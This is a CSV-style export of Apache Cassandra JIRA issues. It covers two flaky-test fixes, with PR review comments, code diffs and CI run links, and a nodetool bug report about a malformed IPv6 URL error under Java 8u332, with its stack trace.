;07/Jun/22 17:26;githubbot;600","smiklosovic commented on code in PR #1662:
URL: https://github.com/apache/cassandra/pull/1662#discussion_r891526068


##########
test/unit/org/apache/cassandra/db/virtual/GossipInfoTableTest.java:
##########
@@ -33,64 +36,58 @@
 import org.apache.cassandra.gms.Gossiper;
 import org.apache.cassandra.locator.InetAddressAndPort;
 
+import static com.google.common.collect.ImmutableList.of;
 import static org.assertj.core.api.Assertions.assertThat;
 
 public class GossipInfoTableTest extends CQLTester
 {
-    private static final String KS_NAME = ""vts"";
-
-    @SuppressWarnings(""FieldCanBeLocal"")
-    private GossipInfoTable table;
-
     @BeforeClass
     public static void setUpClass()
     {
         CQLTester.setUpClass();
     }
 
-    @Before
-    public void config()
-    {
-        table = new GossipInfoTable(KS_NAME);
-        VirtualKeyspaceRegistry.instance.register(new VirtualKeyspace(KS_NAME, ImmutableList.of(table)));
-    }
-
     @Test
     public void testSelectAllWhenGossipInfoIsEmpty() throws Throwable
     {
-        assertEmpty(execute(""SELECT * FROM vts.gossip_info""));
+        // we have not triggered gossiper yet
+        VirtualKeyspaceRegistry.instance.register(new VirtualKeyspace(""vts_1"",
+                                                                      of(new GossipInfoTable(""vts_1"", HashMap::new))));
+        assertEmpty(execute(""SELECT * FROM vts_1.gossip_info""));
     }
 
-    @SuppressWarnings(""deprecation"")
     @Test
     public void testSelectAllWithStateTransitions() throws Throwable
     {
         try
         {
             requireNetwork(); // triggers gossiper
 
-            UntypedResultSet resultSet = execute(""SELECT * FROM vts.gossip_info"");
+            ConcurrentMap<InetAddressAndPort, EndpointState> states = Gossiper.instance.endpointStateMap;
+            Awaitility.await().until(() -> !states.isEmpty());
+            Map.Entry<InetAddressAndPort, EndpointState> entry = states.entrySet().stream().findFirst()
+                    .orElseThrow(AssertionError::new);
+            InetAddressAndPort endpoint = entry.getKey();
+            EndpointState localState = new EndpointState(entry.getValue());
 
-            assertThat(resultSet.size()).isEqualTo(1);
-            assertThat(Gossiper.instance.endpointStateMap.size()).isEqualTo(1);
+            Supplier<Map<InetAddressAndPort, EndpointState>> endpointStateMapSupplier = () -> new HashMap<InetAddressAndPort, EndpointState>() {{put(endpoint, localState);}};
 
-            Optional<Map.Entry<InetAddressAndPort, EndpointState>> entry = Gossiper.instance.endpointStateMap.entrySet()

Review Comment:
   ah right, thanks, always forget to check that ... 



;07/Jun/22 17:29;githubbot;600","smiklosovic commented on code in PR #1662:
URL: https://github.com/apache/cassandra/pull/1662#discussion_r891528718


##########
src/java/org/apache/cassandra/db/virtual/GossipInfoTable.java:
##########
@@ -76,10 +87,10 @@ final class GossipInfoTable extends AbstractVirtualTable
     public DataSet data()
     {
         SimpleDataSet result = new SimpleDataSet(metadata());
-        for (Map.Entry<InetAddressAndPort, EndpointState> entry : Gossiper.instance.endpointStateMap.entrySet())
+        for (Map.Entry<InetAddressAndPort, EndpointState> entry : endpointStateMapSupplier.get().entrySet())
         {
             InetAddressAndPort endpoint = entry.getKey();
-            EndpointState localState = entry.getValue();
+            EndpointState localState = new EndpointState(entry.getValue());

Review Comment:
   ok i ll add it.



;07/Jun/22 17:31;githubbot;600","smiklosovic closed pull request #1662: CASSANDRA-17584
URL: https://github.com/apache/cassandra/pull/1662


;07/Jun/22 21:40;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,4800,,,0,4800,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,smiklosovic,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jun 08 10:37:49 UTC 2022,,,,,,,All,,,,"0|z11vlk:",9223372036854775807,,,,adelapena,,,,Normal,,4.1-alpha1,,https://github.com/apache/cassandra/commit/457e16c27ee65063fa15963c58bea3e9a63c5aa5,,,,,,,,,unit tests,,,,,"01/Jun/22 22:43;e.dimitrova;I was not able to reproduce it in CircleCI - https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17584-4.1&filter=all

But it seems flaky in Butler in both 4.1 and trunk.

It seems it was added end of March and ticket opened in April, so it might be test issue from the very beginning.

I haven't compared the tests but I see that nodetool gossipinfo and this table should be providing the same info. The nodetool gossipinfo test is stable though. 

[~frankgh], [~yifanc], [~stefan.miklosovic], can anyone of you, please, take a look into this one?    ;;;","02/Jun/22 11:44;smiklosovic;I am on it.;;;","02/Jun/22 12:33;smiklosovic;PR here: https://github.com/apache/cassandra/pull/1662
Circle 500x: https://app.circleci.com/pipelines/github/instaclustr/cassandra/1025/workflows/1b958082-c873-404e-89f2-3b454547f679/jobs/4307
Jenkins: https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1751/

The problem is, I think, that the map the gossiper returns consists of values (EndpointState) which are updated on the fly during the test. There is LoadBroadcaster which is updating the state every so often so these values change over time during the test.

What I did is that I am going into the test with copy of that map / EndpointState so it is not updated and values are all same for the sake of testing it.;;;","07/Jun/22 11:17;adelapena;Nice investigation, I agree that the problem is {{LoadBroadcaster}} modifying {{Gossiper#endpointStateMap}} in the background.

The failure can be reproduced locally by playing with the delays supplied by the call to {{scheduleWithFixedDelay}} that is made by {{{}LoadBroadcaster#startBroadcasting{}}}. It can also be reproduced without any changes with some more iterations in the multiplexer, as it's shown by [this run|https://app.circleci.com/pipelines/github/adelapena/cassandra/1670/workflows/314282a7-2530-4494-aa98-01b67099c3c2/jobs/17534].

The proposed patch allowing to provide a custom endpoint state map to {{GossipInfoTable}} looks good to me, I have only left a couple of minor suggestions on the PR.;;;","07/Jun/22 12:31;smiklosovic;Thanks [~adelapena] for the review, I would really appreciate if you answered this question (1), once resolved I think we can ship it.

(1) https://github.com/apache/cassandra/pull/1662/files#r891085898;;;","07/Jun/22 15:12;adelapena;[~smiklosovic] just answered that. I see that the other conversations are marked as resolved, but I don't see any changes nor comments about those nits. Maybe you forgot to push the changes?;;;","07/Jun/22 16:16;smiklosovic;[~adelapena] yes, just pushed. I ll provide circles soon.;;;","07/Jun/22 19:57;smiklosovic;https://app.circleci.com/pipelines/github/instaclustr/cassandra/1057/workflows/f0087467-b7ab-4055-be7d-43fb3aee0198;;;","07/Jun/22 23:35;adelapena;It seems this has been committed to 4.1 without running the pre-commit tests, nor additional multiplexer runs for the modified test. I don't see any CI results for trunk either. Here are the missed runs:
||Branch||CI||
|4.1|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1677/workflows/575d0a97-5568-4779-be06-ff8164f60c8e] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1677/workflows/9fb4e85e-fa97-4a6c-8c2c-9b5cc3ae7f05]|
|trunk|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1678/workflows/1dd1dc71-297d-4b55-8dca-9813dca4f985] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1678/workflows/a70374ab-b888-4931-9ec8-0940be3bfd75]|

 ;;;","08/Jun/22 10:37;adelapena;All the failures on the previous CI runs seem well-known:

cassandra-4.1 j8
* {{org.apache.cassandra.distributed.test.RepairErrorsTest.testRemoteStreamFailure}}: Timeout, possibly CASSANDRA-17321

trunk j8
* {{utests_system_keyspace_directory}}: CASSANDRA-17489

trunk j11
* {{bootstrap_test.py::bootstrap_test.TestBootstrap::test_bootstrap_binary_disabled}}: CASSANDRA-17077
* {{bootstrap_test.py::bootstrap_test.TestBootstrap::test_node_cannot_join_as_hibernating_node_without_replace_address}}: CASSANDRA-16816
* {{bootstrap_test.py::bootstrap_test.TestBootstrap::test_failed_bootstrap_wiped_node_can_join}}: CASSANDRA-17308

The only one I'm not so sure about is the timeout in {{testRemoteStreamFailure}}, which we haven't see failing before.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky test - org.apache.cassandra.distributed.test.MessageForwardingTest.mutationsForwardedToAllReplicasTest,CASSANDRA-17583,13442099,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jonmeredith,brandon.williams,brandon.williams,27/Apr/22 14:32,07/Mar/23 10:38,13/Jul/23 08:40,06/Jun/22 17:18,3.0.28,3.11.14,4.0.5,4.1-beta1,5.0,,Messaging/Internode,,,,0,,"h3. Error Message

/127.0.0.3 appending to commitlog traces expected:<100> but was:<98>
h3. Stacktrace
{noformat}
junit.framework.AssertionFailedError: /127.0.0.3 appending to commitlog traces expected:<100> but was:<98> at org.apache.cassandra.distributed.test.MessageForwardingTest.lambda$mutationsForwardedToAllReplicasTest$8(MessageForwardingTest.java:92) at java.base/java.util.HashMap.forEach(HashMap.java:1336) at org.apache.cassandra.distributed.test.MessageForwardingTest.mutationsForwardedToAllReplicasTest(MessageForwardingTest.java:91) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
{noformat}",,dcapwell,e.dimitrova,jonmeredith,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jonmeredith,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Jun 06 16:32:42 UTC 2022,,,,,,,All,,,,"0|z11vko:",9223372036854775807,,,,dcapwell,,,,Normal,,3.0.19,,https://github.com/apache/cassandra/commit/8bc666e5b1e717d76c96696efdee70edac115a85,,,,,,,,,Updated test,,,,,"30/May/22 17:58;e.dimitrova;I was not able to reproduce it on the current 4.1 branch - CI run  [here|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17583-4.1&filter=all] but I still see it failed once lately in Butler - https://ci-cassandra.apache.org/job/Cassandra-4.1/35/testReport/org.apache.cassandra.distributed.test/MessageForwardingTest/mutationsForwardedToAllReplicasTest/;;;","31/May/22 16:10;jonmeredith;I can take a look at this.;;;","31/May/22 16:14;e.dimitrova;Thanks, [~jonmeredith] :) ;;;","03/Jun/22 16:07;jonmeredith;I wasn't able to reproduce, but from the error it looks like the traces haven't completed yet. Tracing is async so I can see busy CI running slow enough to fail.  I've patched to make sure the trace stages are empty across the cluster.
[3.0|https://github.com/jonmeredith/cassandra/tree/C17583-3.0] [PR|https://github.com/apache/cassandra/pull/1669]
[3.11|https://github.com/jonmeredith/cassandra/tree/C17583-3.11] [PR|https://github.com/apache/cassandra/pull/1670]
[4.0|https://github.com/jonmeredith/cassandra/tree/C17583-4.0] [PR|https://github.com/apache/cassandra/pull/1666]
[4.1|https://github.com/jonmeredith/cassandra/tree/C17583-4.1] [PR|https://github.com/apache/cassandra/pull/1667]
[trunk|https://github.com/jonmeredith/cassandra/tree/C17583-trunk] [PR|https://github.com/apache/cassandra/pull/1668] 
 ;;;","03/Jun/22 16:08;jonmeredith;Ran 100 times without problems on trunk

https://app.circleci.com/pipelines/github/jonmeredith/cassandra/662/workflows/22692f9b-1c4d-4cfb-996d-08891a4683d3/jobs/3890;;;","03/Jun/22 16:09;dcapwell;LGTM +1;;;","03/Jun/22 17:02;jonmeredith;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-3.0|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17583-cassandra-3.0-68DA7E5C-5691-4724-A9E9-66DC78281830]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17583-cassandra-3.0-68DA7E5C-5691-4724-A9E9-66DC78281830]|[build|unknown]|
|cassandra-3.11|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17583-cassandra-3.11-68DA7E5C-5691-4724-A9E9-66DC78281830]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17583-cassandra-3.11-68DA7E5C-5691-4724-A9E9-66DC78281830]|[build|unknown]|
|cassandra-4.0|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17583-cassandra-4.0-68DA7E5C-5691-4724-A9E9-66DC78281830]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17583-cassandra-4.0-68DA7E5C-5691-4724-A9E9-66DC78281830]|[build|unknown]|
|cassandra-4.1|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17583-cassandra-4.1-68DA7E5C-5691-4724-A9E9-66DC78281830]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17583-cassandra-4.1-68DA7E5C-5691-4724-A9E9-66DC78281830]|[build|unknown]|
|trunk|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17583-trunk-68DA7E5C-5691-4724-A9E9-66DC78281830]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17583-trunk-68DA7E5C-5691-4724-A9E9-66DC78281830]|[build|unknown]|;;;","06/Jun/22 16:32;jonmeredith;Had some CI issues, so resubmitted.

Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-3.0|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17583-cassandra-3.0-8ACFE850-73AF-4D5C-AC83-9122E08204E9]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17583-cassandra-3.0-8ACFE850-73AF-4D5C-AC83-9122E08204E9]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1764/]|
|cassandra-3.11|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17583-cassandra-3.11-8ACFE850-73AF-4D5C-AC83-9122E08204E9]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17583-cassandra-3.11-8ACFE850-73AF-4D5C-AC83-9122E08204E9]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1765/]|
|cassandra-4.0|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17583-cassandra-4.0-8ACFE850-73AF-4D5C-AC83-9122E08204E9]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17583-cassandra-4.0-8ACFE850-73AF-4D5C-AC83-9122E08204E9]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1766/]|
|cassandra-4.1|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17583-cassandra-4.1-8ACFE850-73AF-4D5C-AC83-9122E08204E9]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17583-cassandra-4.1-8ACFE850-73AF-4D5C-AC83-9122E08204E9]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1767/]|
|trunk|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17583-trunk-8ACFE850-73AF-4D5C-AC83-9122E08204E9]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17583-trunk-8ACFE850-73AF-4D5C-AC83-9122E08204E9]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1768/]|
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"nodetool with Java 8u331 returns ""URISyntaxException: 'Malformed IPv6 address at index 7: rmi://[127.0.0.1]:7199'""",CASSANDRA-17581,13441793,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Urgent,Fixed,brandon.williams,jermy,jermy,26/Apr/22 11:47,12/Sep/22 15:20,13/Jul/23 08:40,05/May/22 11:17,3.0.27,3.11.13,4.0.4,4.1,4.1-alpha1,,Tool/nodetool,,,,2,," Error when {{{color:#0747a6}new NodeProbe(""127.0.0.1"", 7199){color}}} with {color:#de350b}JDK 1.8.0_332{color}:
{code:java}
java.io.IOException: Failed to retrieve RMIServer stub:
 javax.naming.InvalidNameException: Malformed IPv6 address at index 7: rmi://[127.0.0.1]:7199
 Root exception is java.lang.IllegalArgumentException: Malformed IPv6 address at index 7: rmi://[127.0.0.1]:7199 {code}

Here is the error stack trace:
{noformat}
2022-04-24 07:22:40 [grizzly-http-server-2] [INFO] c.b.h.b.s.c.CassandraMetrics - Probe to cassandra node: '127.0.0.1:7199'
2022-04-24 07:22:40 [grizzly-http-server-2] [WARN] c.b.h.b.s.c.CassandraMetrics - Unable to get metrics from host '127.0.0.1':
java.io.IOException: Failed to retrieve RMIServer stub: javax.naming.InvalidNameException: Malformed IPv6 address at index 7: rmi://[127.0.0.1]:7199 [Root exception is java.lang.IllegalArgumentException: Malformed IPv6 address at index 7: rmi://[127.0.0.1]:7199]
    at javax.management.remote.rmi.RMIConnector.connect(RMIConnector.java:369) ~[?:1.8.0_332]
    at javax.management.remote.JMXConnectorFactory.connect(JMXConnectorFactory.java:270) ~[?:1.8.0_332]
    at org.apache.cassandra.tools.NodeProbe.connect(NodeProbe.java:191) ~[cassandra-all-3.10.jar:3.10]
    at org.apache.cassandra.tools.NodeProbe.<init>(NodeProbe.java:158) ~[cassandra-all-3.10.jar:3.10]
    at com.baidu.hugegraph.backend.store.cassandra.CassandraMetrics.newNodeProbe(CassandraMetrics.java:308) ~[hugegraph-cassandra-0.13.0.jar:?]
    at com.baidu.hugegraph.backend.store.cassandra.CassandraMetrics.getMetricsByHost(CassandraMetrics.java:100) ~[hugegraph-cassandra-0.13.0.jar:?]
    at com.baidu.hugegraph.backend.store.cassandra.CassandraMetrics.executeAllHosts(CassandraMetrics.java:299) ~[hugegraph-cassandra-0.13.0.jar:?]
    at com.baidu.hugegraph.backend.store.cassandra.CassandraMetrics.metrics(CassandraMetrics.java:86) ~[hugegraph-cassandra-0.13.0.jar:?]
    at com.baidu.hugegraph.backend.store.cassandra.CassandraStore.lambda$registerMetaHandlers$0(CassandraStore.java:99) ~[hugegraph-cassandra-0.13.0.jar:?]
    at com.baidu.hugegraph.backend.store.MetaDispatcher.dispatchMetaHandler(MetaDispatcher.java:45) ~[hugegraph-core-0.13.0.jar:0.13.0.0]
    at com.baidu.hugegraph.backend.store.AbstractBackendStore.metadata(AbstractBackendStore.java:53) ~[hugegraph-core-0.13.0.jar:0.13.0.0]
    at com.baidu.hugegraph.backend.tx.AbstractTransaction.metadata(AbstractTransaction.java:109) ~[hugegraph-core-0.13.0.jar:0.13.0.0]
    at com.baidu.hugegraph.StandardHugeGraph.metadata(StandardHugeGraph.java:975) ~[hugegraph-core-0.13.0.jar:0.13.0.0]
    at com.baidu.hugegraph.auth.HugeGraphAuthProxy.metadata(HugeGraphAuthProxy.java:669) ~[hugegraph-api-0.13.0.jar:0.67.0.0]
    at com.baidu.hugegraph.api.metrics.MetricsAPI.backend(MetricsAPI.java:87) ~[hugegraph-api-0.13.0.jar:0.67.0.0]
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_332]
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[?:1.8.0_332]
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:1.8.0_332]
    at java.lang.reflect.Method.invoke(Method.java:498) ~[?:1.8.0_332]
    at org.glassfish.jersey.server.model.internal.ResourceMethodInvocationHandlerFactory$1.invoke(ResourceMethodInvocationHandlerFactory.java:81) ~[jersey-server-2.25.1.jar:?]
    at org.glassfish.jersey.server.model.internal.AbstractJavaResourceMethodDispatcher$1.run(AbstractJavaResourceMethodDispatcher.java:144) ~[jersey-server-2.25.1.jar:?]
    at org.glassfish.jersey.server.model.internal.AbstractJavaResourceMethodDispatcher.invoke(AbstractJavaResourceMethodDispatcher.java:161) ~[jersey-server-2.25.1.jar:?]
    at org.glassfish.jersey.server.model.internal.JavaResourceMethodDispatcherProvider$TypeOutInvoker.doDispatch(JavaResourceMethodDispatcherProvider.java:205) ~[jersey-server-2.25.1.jar:?]
    at org.glassfish.jersey.server.model.internal.AbstractJavaResourceMethodDispatcher.dispatch(AbstractJavaResourceMethodDispatcher.java:99) ~[jersey-server-2.25.1.jar:?]
    at org.glassfish.jersey.server.model.ResourceMethodInvoker.invoke(ResourceMethodInvoker.java:389) ~[jersey-server-2.25.1.jar:?]
    at org.glassfish.jersey.server.model.ResourceMethodInvoker.apply(ResourceMethodInvoker.java:347) ~[jersey-server-2.25.1.jar:?]
    at org.glassfish.jersey.server.model.ResourceMethodInvoker.apply(ResourceMethodInvoker.java:102) ~[jersey-server-2.25.1.jar:?]
    at org.glassfish.jersey.server.ServerRuntime$2.run(ServerRuntime.java:326) ~[jersey-server-2.25.1.jar:?]
    at org.glassfish.jersey.internal.Errors$1.call(Errors.java:271) ~[jersey-common-2.25.1.jar:?]
    at org.glassfish.jersey.internal.Errors$1.call(Errors.java:267) ~[jersey-common-2.25.1.jar:?]
    at org.glassfish.jersey.internal.Errors.process(Errors.java:315) ~[jersey-common-2.25.1.jar:?]
    at org.glassfish.jersey.internal.Errors.process(Errors.java:297) ~[jersey-common-2.25.1.jar:?]
    at org.glassfish.jersey.internal.Errors.process(Errors.java:267) ~[jersey-common-2.25.1.jar:?]
    at org.glassfish.jersey.process.internal.RequestScope.runInScope(RequestScope.java:317) ~[jersey-common-2.25.1.jar:?]
    at org.glassfish.jersey.server.ServerRuntime.process(ServerRuntime.java:305) ~[jersey-server-2.25.1.jar:?]
    at org.glassfish.jersey.server.ApplicationHandler.handle(ApplicationHandler.java:1154) ~[jersey-server-2.25.1.jar:?]
    at org.glassfish.jersey.grizzly2.httpserver.GrizzlyHttpContainer.service(GrizzlyHttpContainer.java:384) ~[jersey-container-grizzly2-http-2.25.1.jar:?]
    at org.glassfish.grizzly.http.server.HttpHandler$1.run(HttpHandler.java:200) ~[grizzly-http-server-2.4.4.jar:2.4.4]
    at org.glassfish.grizzly.threadpool.AbstractThreadPool$Worker.doWork(AbstractThreadPool.java:569) ~[grizzly-framework-2.4.4.jar:2.4.4]
    at org.glassfish.grizzly.threadpool.AbstractThreadPool$Worker.run(AbstractThreadPool.java:549) ~[grizzly-framework-2.4.4.jar:2.4.4]
    at java.lang.Thread.run(Thread.java:750) [?:1.8.0_332]
Caused by: javax.naming.InvalidNameException: Malformed IPv6 address at index 7: rmi://[127.0.0.1]:7199
    at com.sun.jndi.url.rmi.rmiURLContext$Parser.newNamingException(rmiURLContext.java:295) ~[?:1.8.0_332]
    at com.sun.jndi.url.rmi.rmiURLContext$Parser.parseCompat(rmiURLContext.java:223) ~[?:1.8.0_332]
    at com.sun.jndi.url.rmi.rmiURLContext$Parser.parse(rmiURLContext.java:109) ~[?:1.8.0_332]
    at com.sun.jndi.url.rmi.rmiURLContext.getRootURLContext(rmiURLContext.java:314) ~[?:1.8.0_332]
    at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:215) ~[?:1.8.0_332]
    at javax.naming.InitialContext.lookup(InitialContext.java:417) ~[?:1.8.0_332]
    at javax.management.remote.rmi.RMIConnector.findRMIServerJNDI(RMIConnector.java:1955) ~[?:1.8.0_332]
    at javax.management.remote.rmi.RMIConnector.findRMIServer(RMIConnector.java:1922) ~[?:1.8.0_332]
    at javax.management.remote.rmi.RMIConnector.connect(RMIConnector.java:287) ~[?:1.8.0_332]
    ... 40 more
Caused by: java.lang.IllegalArgumentException: Malformed IPv6 address at index 7: rmi://[127.0.0.1]:7199
    at java.net.URI.create(URI.java:852) ~[?:1.8.0_332]
    at com.sun.jndi.url.rmi.rmiURLContext$Parser.parseCompat(rmiURLContext.java:213) ~[?:1.8.0_332]
    at com.sun.jndi.url.rmi.rmiURLContext$Parser.parse(rmiURLContext.java:109) ~[?:1.8.0_332]
    at com.sun.jndi.url.rmi.rmiURLContext.getRootURLContext(rmiURLContext.java:314) ~[?:1.8.0_332]
    at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:215) ~[?:1.8.0_332]
    at javax.naming.InitialContext.lookup(InitialContext.java:417) ~[?:1.8.0_332]
    at javax.management.remote.rmi.RMIConnector.findRMIServerJNDI(RMIConnector.java:1955) ~[?:1.8.0_332]
    at javax.management.remote.rmi.RMIConnector.findRMIServer(RMIConnector.java:1922) ~[?:1.8.0_332]
    at javax.management.remote.rmi.RMIConnector.connect(RMIConnector.java:287) ~[?:1.8.0_332]
    ... 40 more
Caused by: java.net.URISyntaxException: Malformed IPv6 address at index 7: rmi://[127.0.0.1]:7199
    at java.net.URI$Parser.fail(URI.java:2873) ~[?:1.8.0_332]
    at java.net.URI$Parser.parseIPv6Reference(URI.java:3494) ~[?:1.8.0_332]
    at java.net.URI$Parser.parseServer(URI.java:3244) ~[?:1.8.0_332]
    at java.net.URI$Parser.parseAuthority(URI.java:3180) ~[?:1.8.0_332]
    at java.net.URI$Parser.parseHierarchical(URI.java:3122) ~[?:1.8.0_332]
    at java.net.URI$Parser.parse(URI.java:3078) ~[?:1.8.0_332]
    at java.net.URI.<init>(URI.java:588) ~[?:1.8.0_332]
    at java.net.URI.create(URI.java:850) ~[?:1.8.0_332]
    at com.sun.jndi.url.rmi.rmiURLContext$Parser.parseCompat(rmiURLContext.java:213) ~[?:1.8.0_332]
    at com.sun.jndi.url.rmi.rmiURLContext$Parser.parse(rmiURLContext.java:109) ~[?:1.8.0_332]
    at com.sun.jndi.url.rmi.rmiURLContext.getRootURLContext(rmiURLContext.java:314) ~[?:1.8.0_332]
    at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:215) ~[?:1.8.0_332]
    at javax.naming.InitialContext.lookup(InitialContext.java:417) ~[?:1.8.0_332]
    at javax.management.remote.rmi.RMIConnector.findRMIServerJNDI(RMIConnector.java:1955) ~[?:1.8.0_332]
    at javax.management.remote.rmi.RMIConnector.findRMIServer(RMIConnector.java:1922) ~[?:1.8.0_332]
    at javax.management.remote.rmi.RMIConnector.connect(RMIConnector.java:287) ~[?:1.8.0_332]
    ... 40 more {noformat}",,bereng,brandon.williams,e.dimitrova,erickramirezau,jeffrey.lam@sjrb.ca,jermy,jeromatron,jmckenzie,kkierer,Rishipandey,sklock,tianon,tsteinmaurer,weisslj,"javeme commented on PR #1586:
URL: https://github.com/apache/cassandra/pull/1586#issuecomment-1109714289

   @ErickRamirezAU Thanks.
   I have created a JIRA issue: https://issues.apache.org/jira/projects/CASSANDRA/issues/CASSANDRA-17581


;26/Apr/22 12:07;githubbot;600","javeme commented on PR #1586:
URL: https://github.com/apache/cassandra/pull/1586#issuecomment-1120604740

   Resolved with merged commit: https://github.com/apache/cassandra/commit/61d4cccb0b137422f8cc8e2a294700753c5a6247
   JIRA: https://issues.apache.org/jira/browse/CASSANDRA-17581


;09/May/22 03:36;githubbot;600","smiklosovic closed pull request #1586: CASSANDRA-17581 fix NodeProbe: Malformed IPv6 address at index
URL: https://github.com/apache/cassandra/pull/1586


;09/May/22 10:19;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,1800,,,0,1800,,,,CASSANDRA-17589,,,,,CASSANDRA-17612,,,,,,,,,,,,CASSANDRA-17885,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Code,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,Clients,,Tue May 31 17:33:33 UTC 2022,,,,,,,All,,,,"0|z11too:",9223372036854775807,,,,bereng,brandon.williams,,,Critical,,NA,,https://github.com/apache/cassandra/commit/61d4cccb0b137422f8cc8e2a294700753c5a6247,,,,,,,,,run CI,,,,,"26/Apr/22 11:50;brandon.williams;Can you provide details of your version and environment, and steps to reproduce?  At first glance it looks like something is adding brackets around the ipv4 localhost address.;;;","26/Apr/22 12:02;jermy;Thanks for your reply.

The reason may be caused by upgrading the JDK version to JDK 8.0.332, here is some environment information:

 

Cassandra version:
 * apache-cassandra-3.10
 * [http://archive.apache.org/dist/cassandra]

 

Java environment:
 * JDK 8.0.332+9
 * Java 8.0.332+9 (Zulu): [https://cdn.azul.com/zulu/bin/zulu8.62.0.19-ca-jdk8.0.332-linux_x64.tar.gz]
 
Operating system environment:
 * Environment: ubuntu-20.04
 * Version: 20220410.2
